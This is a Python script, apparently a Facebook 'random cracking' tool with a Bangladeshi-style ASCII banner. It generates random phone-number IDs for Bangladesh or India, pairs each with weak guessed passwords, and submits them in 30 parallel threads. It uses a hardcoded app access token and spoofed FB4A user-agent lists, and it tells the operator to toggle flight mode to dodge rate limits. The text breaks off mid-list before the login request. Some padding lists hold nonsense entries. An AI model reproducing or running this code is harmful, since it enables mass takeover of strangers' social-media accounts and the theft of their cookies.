#-----------------------[ INFO-CODE ]-----------------------#
"""Open By   : Tanim Hossain [BHOOT-CYBER]
Developer : Tanim Hossain
Github    : Bhoot-Cyber-143
Status    : Open Source"""
#-----------------------[ IMPORT-CODE ]-----------------------#
import os
import sys
import marshal, base64, zlib
from os import path
import os,base64,zlib,pip,urllib
try:
        os.system('clear')
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------------[ COLOR-CODE ]-----------------------#
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'
#-----------------------[ HEXXX-CODE ]-----------------------#
user=[];ok=[];cp=[];twf=[];cpx=[];cokix=[];plist=[];loop=0
#-----------------------[ SC-CODE ]-----------------------#
main_x = '(1) Bd Random \n (2) India random \n (3) Exit menu';bd_x = '017 | 018 | 019';ind_x = '+91639 | +91600 | +91620';line_x = '==================================================';cp_x = 'Do You Went Show Cp Ids (Y|N)';coki_x = 'Do You Went Show Cookies (Y|N)';c = 'Choice'
#-----------------------[ LOGO-CODE ]-----------------------#
logo = f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m$$$$$$\  \033[0;92m $$$$$$\  \033[0;92m$$$$$$\ \033[0;92m$$$$$$$$\    \033[0;92m     ║
║\033[0;92m$$  __$$\ \033[0;92m$$  __$$\ \033[0;92m\_$$  _|\033[0;92m$$  _____|   \033[0;92m    ║
║\033[0;92m$$ /  $$ |\033[0;92m$$ /  \__|  \033[0;92m$$ |  \033[0;92m$$ |      \033[0;92m       ║
║\033[0;92m$$$$$$$$ |\033[0;92m$$$$$$\     \033[0;92m$$ |  \033[0;92m$$$$$\        \033[0;92m   ║
║\033[0;92m$$  __$$ | \033[0;92m\____$$\   \033[0;92m$$ |  \033[0;92m$$  __|         \033[0;92m ║
║\033[0;92m$$ |  $$ |\033[0;92m$$\   $$ |  \033[0;92m$$ |  \033[0;92m$$ |            \033[0;92m ║
║\033[0;92m$$ |  $$ |\033[0;92m\$$$$$$  |\033[0;92m$$$$$$\ \033[0;92m$$ |            \033[0;92m ║
║\033[0;92m\__|  \__| \033[0;92m\______/ \033[0;92m\______|\033[0;92m\__|            \033[0;92m ║
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m    [ 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 𝑶𝑵𝑳𝒀 𝑩𝑨𝑵𝑮𝑳𝑨𝑫𝑬𝑺𝑯 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 ]\033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;92m
╠══[𝐶𝑅𝐸𝐴𝑇𝑂𝑅                • \33[1;38m𝑨𝐿𝐴𝑋_𝑨𝑆𝐼𝐹]\33[1;38m     \033[1;31m                 
╠══[𝑀𝑌 𝐺𝐼𝑇𝐻𝑈𝐵              • \33[1;38m𝑅2𝐹10-56-790 ]   \33[1;34m                                 
╠══[𝐶𝑂𝑁𝑇𝐴𝐶𝑇                • 018***^^^07 ] \33[1;35m                                                           
╠══[𝐶𝐴𝑀𝐴𝑁𝐷                 • 𝑂𝑁𝐿𝑌 𝑀𝐸  ]     \33[1;32m                                                          
╠══[𝑉𝐸𝑅𝑇𝐼𝑂𝑁                • 1.3 ]        \033[1;35m                                                                       
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[0;92m
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱"""
#-----------------------[ CLEAR-CODE ]-----------------------#
def fresh():os.system('clear');print(logo)
#-----------------------[ LINE-CODE ]-----------------------#
def line():print(f'{line_x}')
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f' (1) Random Cracking \n (2) Help Senter \n (3) Exit Manu ');line()
    manu = input(f' (+) {c} : ')
    if manu in ['1','01']:country()
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/cyber.king.tanim');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
    fresh();print(f' {main_x} ');line()
    con_ck = input(f' (+) {c} : ')
    if con_ck in ['1','01']:rndm_bd()
    elif con_ck in ['2','02']:rndm_ind()
    else:Main()
#-----------------------[ RNDM-CODE-BD ]-----------------------#
def rndm_bd():
        fresh();print(f' (+) Example : {bd_x} ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-INDIA ]-----------------------#
def rndm_ind():
        fresh();print(f' (+) Example : {ind_x}  ');line();code = input(f' (+) Find Sim Code : ')
        fresh();print(f' (+) Example : 1000 | 2000 | 5000 ');line();limit = int(input(f' (+) Find Limit : '))
        fresh();print(f' (+) {cp_x} ');line();cpy = input(f' (+) {c} (Y|N) : ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f' (+) {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = [ids[:6],ids[:8],ids,'57273200','57575751','59039200','57575752']
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} (Finding) ({loop}) ({str(ids)}) ({len(ok)}|{len(cp)})');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        # Define possible values for each part of the User-Agent string
                        fban_fb4a = [
    'FBAN/FB4A',
    'FBAN/FB4A;FBAV/301.0.0.0.65',
    'FBAN/FB4A;FBAV/302.0.0.0.66',
    'FBAN/FB4A;FBAV/303.0.0.0.67',
    'FBAN/FB4A;FBAV/304.0.0.0.68',
    'FBAN/FB4A;FBAV/305.0.0.0.69',
    'FBAN/FB4A;FBAV/306.0.0.0.70',
    'FBAN/FB4A;FBAV/307.0.0.0.71',
    'FBAN/FB4A;FBAV/308.0.0.0.72',
    'FBAN/FB4A;FBAV/309.0.0.0.73',
    'FBAN/FB4A;FBAV/310.0.0.0.74',
    'FBAN/FB4A;FBAV/311.0.0.0.75',
    'FBAN/FB4A;FBAV/312.0.0.0.76',
    'FBAN/FB4A;FBAV/313.0.0.0.77',
    'FBAN/FB4A;FBAV/314.0.0.0.78',
    'FBAN/FB4A;FBAV/315.0.0.0.79',
    'FBAN/FB4A;FBAV/316.0.0.0.80',
    'FBAN/FB4A;FBAV/317.0.0.0.81',
    'FBAN/FB4A;FBAV/318.0.0.0.82',
    'FBAN/FB4A;FBAV/319.0.0.0.83',
    'FBAN/FB4A;FBAV/320.0.0.0.84',
    'FBAN/FB4A;FBAV/321.0.0.0.85',
    'FBAN/FB4A;FBAV/322.0.0.0.86',
    'FBAN/FB4A;FBAV/323.0.0.0.87',
    'FBAN/FB4A;FBAV/324.0.0.0.88',
    'FBAN/FB4A;FBAV/325.0.0.0.89',
    'FBAN/FB4A;FBAV/326.0.0.0.90',
    'FBAN/FB4A;FBAV/327.0.0.0.91',
    'FBAN/FB4A;FBAV/328.0.0.0.92',
    'FBAN/FB4A;FBAV/329.0.0.0.93',
    'FBAN/FB4A;FBAV/330.0.0.0.94',
    'FBAN/FB4A;FBAV/331.0.0.0.95',
    'FBAN/FB4A;FBAV/332.0.0.0.96',
    'FBAN/FB4A;FBAV/333.0.0.0.97',
    'FBAN/FB4A;FBAV/334.0.0.0.98',
    'FBAN/FB4A;FBAV/335.0.0.0.99',
    'FBAN/FB4A;FBAV/336.0.0.0.100',
    'FBAN/FB4A;FBAV/337.0.0.0.101',
    'FBAN/FB4A;FBAV/338.0.0.0.102',
    'FBAN/FB4A;FBAV/339.0.0.0.103',
    'FBAN/FB4A;FBAV/340.0.0.0.104',
    'FBAN/FB4A;FBAV/341.0.0.0.105',
    'FBAN/FB4A;FBAV/342.0.0.0.106',
    'FBAN/FB4A;FBAV/343.0.0.0.107',
    'FBAN/FB4A;FBAV/344.0.0.0.108',
    'FBAN/FB4A;FBAV/345.0.0.0.109',
    'FBAN/FB4A;FBAV/346.0.0.0.110',
    'FBAN/FB4A;FBAV/347.0.0.0.111',
    'FBAN/FB4A;FBAV/348.0.0.0.112',
    'FBAN/FB4A;FBAV/349.0.0.0.113']
                        fbav = ['FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999))]
                        fbbv = ['FBBV/' + str(random.randint(1111111, 9999999))]
                        fbdm = [
    'FBDM/{density=1.0,width=320,height=480}',
    'FBDM/{density=1.0,width=320,height=568}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=414,height=736}',
    'FBDM/{density=1.0,width=375,height=812}',
    'FBDM/{density=1.0,width=414,height=896}',
    'FBDM/{density=1.0,width=360,height=780}',
    'FBDM/{density=1.0,width=412,height=846}',
    'FBDM/{density=1.0,width=411,height=731}',
    'FBDM/{density=1.0,width=412,height=847}',
    'FBDM/{density=1.0,width=393,height=786}',
    'FBDM/{density=1.0,width=392,height=820}',
    'FBDM/{density=1.0,width=412,height=869}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=412,height=846}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=393,height=851}',
    'FBDM/{density=1.0,width=360,height=683}',
    'FBDM/{density=1.0,width=412,height=847}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=411,height=731}',
    'FBDM/{density=1.0,width=414,height=896}',
    'FBDM/{density=1.0,width=375,height=812}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=780}',
    'FBDM/{density=1.0,width=320,height=480}',
    'FBDM/{density=1.0,width=320,height=568}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=414,height=736}',
    'FBDM/{density=1.0,width=375,height=812}',
    'FBDM/{density=1.0,width=414,height=896}',
    'FBDM/{density=1.0,width=360,height=780}',
    'FBDM/{density=1.0,width=412,height=846}',
    'FBDM/{density=1.0,width=411,height=731}',
    'FBDM/{density=1.0,width=412,height=847}',
    'FBDM/{density=1.0,width=393,height=786}',
    'FBDM/{density=1.0,width=392,height=820}',
    'FBDM/{density=1.0,width=412,height=869}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=412,height=846}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=393,height=851}',
    'FBDM/{density=1.0,width=360,height=683}',
    'FBDM/{density=1.0,width=412,height=847}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=411,height=731}',
    'FBDM/{density=1.0,width=414,height=896}',
    'FBDM/{density=1.0,width=375,height=812}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=780}',
    'FBDM/{density=1.0,width=320,height=480}',
    'FBDM/{density=1.0,width=320,height=568}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=414,height=736}',
    'FBDM/{density=1.0,width=375,height=812}',
    'FBDM/{density=1.0,width=414,height=896}',
    'FBDM/{density=1.0,width=360,height=780}',
    'FBDM/{density=1.0,width=412,height=846}',
    'FBDM/{density=1.0,width=411,height=731}',
    'FBDM/{density=1.0,width=412,height=847}',
    'FBDM/{density=1.0,width=393,height=786}',
    'FBDM/{density=1.0,width=392,height=820}',
    'FBDM/{density=1.0,width=412,height=869}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=412,height=846}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=393,height=851}',
    'FBDM/{density=1.0,width=360,height=683}',
    'FBDM/{density=1.0,width=412,height=847}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=411,height=731}',
    'FBDM/{density=1.0,width=414,height=896}',
    'FBDM/{density=1.0,width=375,height=812}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=780}',
    'FBDM/{density=1.0,width=320,height=480}',
    'FBDM/{density=1.0,width=320,height=568}',
    'FBDM/{density=1.0,width=360,height=640}',
    'FBDM/{density=1.0,width=375,height=667}',
    'FBDM/{density=1.0,width=360,height=720}',
    'FBDM/{density=1.0,width=414,height=736}',
    'FBDM/{density=1.0,width=375,height=812}']                        
                        fblc = [
    'FBLC/en_US',
    'FBLC/en_GB',
    'FBLC/es_ES',
    'FBLC/es_LA',
    'FBLC/fr_FR',
    'FBLC/de_DE',
    'FBLC/it_IT',
    'FBLC/nl_NL',
    'FBLC/pt_BR',
    'FBLC/pt_PT',
    'FBLC/ar_AR',
    'FBLC/bn_IN',
    'FBLC/zh_CN',
    'FBLC/zh_HK',
    'FBLC/zh_TW',
    'FBLC/hr_HR',
    'FBLC/cs_CZ',
    'FBLC/da_DK',
    'FBLC/nl_NL',
    'FBLC/fi_FI',
    'FBLC/fr_FR',
    'FBLC/de_DE',
    'FBLC/el_GR',
    'FBLC/iw_IL',
    'FBLC/hi_IN',
    'FBLC/hu_HU',
    'FBLC/in_ID',
    'FBLC/ja_JP',
    'FBLC/ko_KR',
    'FBLC/ms_MY',
    'FBLC/nb_NO',
    'FBLC/fa_IR',
    'FBLC/pl_PL',
    'FBLC/ro_RO',
    'FBLC/ru_RU',
    'FBLC/sr_RS',
    'FBLC/sk_SK',
    'FBLC/sl_SI',
    'FBLC/es_CL',
    'FBLC/sv_SE',
    'FBLC/tl_PH',
    'FBLC/th_TH',
    'FBLC/tr_TR',
    'FBLC/uk_UA',
    'FBLC/vi_VN',
    'FBLC/cy_GB',
    'FBLC/ur_PK',
    'FBLC/fy_NL',
    'FBLC/ne_NP',
    'FBLC/sq_AL',
    'FBLC/am_ET',
    'FBLC/hy_AM',
    'FBLC/az_AZ',
    'FBLC/eu_ES',
    'FBLC/be_BY',
    'FBLC/bs_BA',
    'FBLC/ka_GE',
    'FBLC/is_IS',
    'FBLC/jv_ID',
    'FBLC/kn_IN',
    'FBLC/kk_KZ',
    'FBLC/km_KH',
    'FBLC/lo_LA',
    'FBLC/la_VA',
    'FBLC/lv_LV',
    'FBLC/lt_LT',
    'FBLC/mk_MK',
    'FBLC/mg_MG',
    'FBLC/ms_BN',
    'FBLC/mt_MT',
    'FBLC/mr_IN',
    'FBLC/mn_MN',
    'FBLC/my_MM',
    'FBLC/nl_BE',
    'FBLC/no_NO',
    'FBLC/or_IN',
    'FBLC/ps_AF',
    'FBLC/fa_AF',
    'FBLC/pa_IN',
    'FBLC/qu_PE',
    'FBLC/ro_MD',
    'FBLC/rw_RW',
    'FBLC/sm_WS',
    'FBLC/st_ZA',
    'FBLC/sn_ZW',
    'FBLC/so_SO',
    'FBLC/sq_MK',
    'FBLC/sr_ME',
    'FBLC/su_ID',
    'FBLC/sw_KE',
    'FBLC/tg_TJ',
    'FBLC/ta_IN',
    'FBLC/tt_RU',
    'FBLC/te_IN',
    'FBLC/th_KH',
    'FBLC/ti_ET',
    'FBLC/to_TO',
    'FBLC/ts_ZA',
    'FBLC/tn_BW',
    'FBLC/tr_CY',
    'FBLC/tk_TM',
    'FBLC/uz_UZ',
    'FBLC/ve_ZA',
    'FBLC/vo_001',
    'FBLC/wa_BE',
    'FBLC/wo_SN',
    'FBLC/xh_ZA',
    'FBLC/yi_US',
    'FBLC/yo_NG',
    'FBLC/zu_ZA']
                        fbrv =[
    'FBRV/541211947',
    'FBRV/0',
    'FBRV/537275962',
    'FBRV/478477801',
    'FBRV/475722615',
    'FBRV/30034644',
    'FBRV/479317306',
    'FBRV/478970936',
    'FBRV/478880211',
    'FBRV/478478064',
    'FBRV/478249893',
    'FBRV/478037428',
    'FBRV/477481714',
    'FBRV/477125993',
    'FBRV/476729007',
    'FBRV/476465495',
    'FBRV/476253783',
    'FBRV/475744275',
    'FBRV/475337385',
    'FBRV/474931337',
    'FBRV/474441042',
    'FBRV/473917206',
    'FBRV/473216533',
    'FBRV/472359048',
    'FBRV/471660229',
    'FBRV/470651795',
    'FBRV/469522557',
    'FBRV/468531229',
    'FBRV/467507693',
    'FBRV/466724884',
    'FBRV/465653504',
    'FBRV/464476908',
    'FBRV/463448586',
    'FBRV/462393688',
    'FBRV/461247332',
    'FBRV/460085039',
    'FBRV/458998020',
    'FBRV/458028990',
    'FBRV/456759719',
    'FBRV/455597378',
    'FBRV/454650357',
    'FBRV/453687517',
    'FBRV/452531181',
    'FBRV/451275304',
    'FBRV/450172551',
    'FBRV/448983014',
    'FBRV/447787030',
    'FBRV/446453875',
    'FBRV/444891874',
    'FBRV/443722429',
    'FBRV/442395281',
    'FBRV/440700434',
    'FBRV/438152587',
    'FBRV/435465179',
    'FBRV/432878540',
    'FBRV/429953098',
    'FBRV/426467586',
    'FBRV/422958444',
    'FBRV/420325899',
    'FBRV/417597586',
    'FBRV/414273080',
    'FBRV/410852912',
    'FBRV/407639217',
    'FBRV/404425199',
    'FBRV/401334144',
    'FBRV/398187692',
    'FBRV/395097061',
    'FBRV/392031060',
    'FBRV/389015326',
    'FBRV/385772744',
    'FBRV/382508485',
    'FBRV/379209121',
    'FBRV/375911389',
    'FBRV/372587842',
    'FBRV/369277756',
    'FBRV/365938936',
    'FBRV/362630531',
    'FBRV/359289291',
    'FBRV/355969540',
    'FBRV/352579744',
    'FBRV/349298014',
    'FBRV/345964358',
    'FBRV/342553169',
    'FBRV/339190213',
    'FBRV/335852353',
    'FBRV/332440744',
    'FBRV/329140261',
    'FBRV/325843309',
    'FBRV/322505412',
    'FBRV/319171616',
    'FBRV/315872340',
    'FBRV/312514289',
    'FBRV/309220097',
    'FBRV/305913356',
    'FBRV/302625731',
    'FBRV/299290432',
    'FBRV/295952127',
    'FBRV/292620569',
    'FBRV/289287935',
    'FBRV/285950460',
    'FBRV/282602451',
    'FBRV/279317302',
    'FBRV/275970156',
    'FBRV/272630402',
    'FBRV/269296165',
    'FBRV/265978679',
    'FBRV/262625013',
    'FBRV/259281689',
    'FBRV/255942133',
    'FBRV/252602470',
    'FBRV/249300742',
    'FBRV/245966906',
    'FBRV/242651116',
    'FBRV/239291759',
    'FBRV/235963618',
    'FBRV/232609215',
    'FBRV/229298064',
    'FBRV/225977275',
    'FBRV/222610496',
    'FBRV/219292266',
    'FBRV/215979260',
    'FBRV/212653107',
    'FBRV/209291682',
    'FBRV/205988690',
    'FBRV/202672005',
    'FBRV/199343264',
    'FBRV/195989604',
    'FBRV/192675462',
    'FBRV/189343227',
    'FBRV/185989722',
    'FBRV/182674360',
    'FBRV/179329186',
    'FBRV/175993336',
    'FBRV/172634134',
    'FBRV/169307012',
    'FBRV/165982720',
    'FBRV/162644551',
    'FBRV/159324610',
    'FBRV/155985430',
    'FBRV/152643544',
    'FBRV/149308748',
    'FBRV/145985537',
    'FBRV/142640018',
    'FBRV/139328299',
    'FBRV/135988582',
    'FBRV/132637181',
    'FBRV/129325659',
    'FBRV/125992176',
    'FBRV/122638086',
    'FBRV/119325324']
                        fbcr = [
    'FBCR/Verizon Wireless',
    'FBCR/AT&T',
    'FBCR/Sprint',
    'FBCR/T-Mobile',
    'FBCR/Metro by T-Mobile',
    'FBCR/US Cellular',
    'FBCR/Boost Mobile',
    'FBCR/Cricket Wireless',
    'FBCR/TracFone Wireless',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/C Spire Wireless',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Cricket Wireless',
    'FBCR/TracFone Wireless',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/C Spire Wireless',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',
    'FBCR/Xfinity Mobile',
    'FBCR/Consumer Cellular',
    'FBCR/Google Fi',
    'FBCR/Republic Wireless',
    'FBCR/Spectrum Mobile',
    'FBCR/Visible',
    'FBCR/Net10 Wireless',
    'FBCR/Simple Mobile',
    'FBCR/Page Plus Cellular',
    'FBCR/H2O Wireless',
    'FBCR/Red Pocket Mobile',
    'FBCR/Total Wireless',
    'FBCR/Reach Mobile',
    'FBCR/Gen Mobile',
    'FBCR/Twigby',
    'FBCR/Tello',
    'FBCR/Mint Mobile',]
                        fbmf = [
    'FBMF/HMD Global',
    'FBMF/TECNO',
    'FBMF/Samsung',
    'FBMF/OnePlus',
    'FBMF/Google',
    'FBMF/Xiaomi',
    'FBMF/Apple',
    'FBMF/HTC',
    'FBMF/LG',
    'FBMF/Sony',
    'FBMF/Motorola',
    'FBMF/Huawei',
    'FBMF/OPPO',
    'FBMF/Vivo',
    'FBMF/Realme',
    'FBMF/Nokia',
    'FBMF/Asus',
    'FBMF/Lenovo',
    'FBMF/ZTE',
    'FBMF/Alcatel',
    'FBMF/Amazon',
    'FBMF/Razer',
    'FBMF/Essential',
    'FBMF/BlackBerry',
    'FBMF/Microsoft',
    'FBMF/Meizu',
    'FBMF/Palm',
    'FBMF/Nextbit',
    'FBMF/LeEco',
    'FBMF/Sharp',
    'FBMF/TCL',
    'FBMF/Google Pixel',
    'FBMF/Google Nexus',
    'FBMF/Google Pixelbook',
    'FBMF/Google Pixel Slate',
    'FBMF/Google Home',
    'FBMF/Google Chromecast',
    'FBMF/Google Nest',
    'FBMF/Google Stadia',
    'FBMF/Google Wifi',
    'FBMF/Google Daydream',
    'FBMF/Google Glass',
    'FBMF/Google Cardboard',
    'FBMF/Google Clips',
    'FBMF/Google Jamboard',
    'FBMF/Google OnHub',
    'FBMF/Google Pixel Buds',
    'FBMF/Google Pixel Stand',
    'FBMF/Google Titan Security Key',
    'FBMF/Google Titan Security Key Mini',
    'FBMF/Google USB Type-C Earbuds',
    'FBMF/Google USB-C to 3.5mm Headphone Adapter',
    'FBMF/Google Nest Hub',
    'FBMF/Google Nest Hub Max',
    'FBMF/Google Nest Mini',
    'FBMF/Google Nest Wifi',
    'FBMF/Google Pixel 4',
    'FBMF/Google Pixel 4 XL',
    'FBMF/Google Pixel 3',
    'FBMF/Google Pixel 3 XL',
    'FBMF/Google Pixel 3a',
    'FBMF/Google Pixel 3a XL',
    'FBMF/Google Pixel 2',
    'FBMF/Google Pixel 2 XL',
    'FBMF/Google Pixel',
    'FBMF/Google Pixel XL',
    'FBMF/Google Pixel C',
    'FBMF/Google Home Mini',
    'FBMF/Google Home Max',
    'FBMF/Google Nest Hub Max',
    'FBMF/Google Nest Hub',
    'FBMF/Google Chromecast',
    'FBMF/Google Chromecast Ultra',
    'FBMF/Google Chromecast Audio',
    'FBMF/Google Wifi',
    'FBMF/Google Nest Wifi',
    'FBMF/Google Daydream View',
    'FBMF/Google Daydream View (2017)',
    'FBMF/Google Cardboard',
    'FBMF/Google Cardboard (2015)',
    'FBMF/Google Clips',
    'FBMF/Google Jamboard',
    'FBMF/Google Pixel Buds',
    'FBMF/Google Pixel Buds (2017)',
    'FBMF/Google Pixel Buds (2020)',
    'FBMF/Google Pixel Stand',
    'FBMF/Google Titan Security Key',
    'FBMF/Google Titan Security Key Mini',
    'FBMF/Google USB Type-C Earbuds',
    'FBMF/Google USB-C to 3.5mm Headphone Adapter',
    'FBMF/Google Assistant',
    'FBMF/Google Assistant (2016)',
    'FBMF/Google Assistant (2017)',
    'FBMF/Google Assistant (2018)',
    'FBMF/Google Assistant (2019)',
    'FBMF/Google Assistant (2020)',
    'FBMF/Google Assistant (2021)',
    'FBMF/Google Assistant (2022)',
    'FBMF/Google Assistant (2023)',
    'FBMF/Google Assistant (2024)',
    'FBMF/Google Assistant (2025)',
    'FBMF/Google Assistant (2026)',
    'FBMF/Google Assistant (2027)',
    'FBMF/Google Assistant (2028)',
    'FBMF/Google Assistant (2029)',
    'FBMF/Google Assistant (2030)',
    'FBMF/Google Assistant (2031)',
    'FBMF/Google Assistant (2032)',
    'FBMF/Google Assistant (2033)',
    'FBMF/Google Assistant (2034)',
    'FBMF/Google Assistant (2035)',
    'FBMF/Google Assistant (2036)',
    'FBMF/Google Assistant (2037)',
    'FBMF/Google Assistant (2038)',
    'FBMF/Google Assistant (2039)',
    'FBMF/Google Assistant (2040)',
    'FBMF/Google Assistant (2041)',
    'FBMF/Google Assistant (2042)',
    'FBMF/Google Assistant (2043)',
    'FBMF/Google Assistant (2044)',
    'FBMF/Google Assistant (2045)',
    'FBMF/Google Assistant (2046)',
    'FBMF/Google Assistant (2047)',
    'FBMF/Google Assistant (2048)',
    'FBMF/Google Assistant (2049)',
    'FBMF/Google Assistant (2050)',
    'FBMF/Google Assistant (2051)',
    'FBMF/Google Assistant (2052)',
    'FBMF/Google Assistant (2053)',
    'FBMF/Google Assistant (2054)',
    'FBMF/Google Assistant (2055)',
    'FBMF/Google Assistant (2056)',
    'FBMF/Google Assistant (2057)',
    'FBMF/Google Assistant (2058)',
    'FBMF/Google Assistant (2059)',
    'FBMF/Google Assistant (2060)',
    'FBMF/Google Assistant (2061)',
    'FBMF/Google Assistant (2062)',
    'FBMF/Google Assistant (2063)',
    'FBMF/Google Assistant (2064)',
    'FBMF/Google Assistant (2065)',
    'FBMF/Google Assistant (2066)',
    'FBMF/Google Assistant (2067)',
    'FBMF/Google Assistant (2068)',
    'FBMF/Google Assistant (2069)',
    'FBMF/Google Assistant (2070)',
    'FBMF/Google Assistant (2071)',
    'FBMF/Google Assistant (2072)',
    'FBMF/Google Assistant (2073)',
    'FBMF/Google Assistant (2074)',
    'FBMF/Google Assistant (2075)',
    'FBMF/Google Assistant (2076)',]
                        fbbd = [
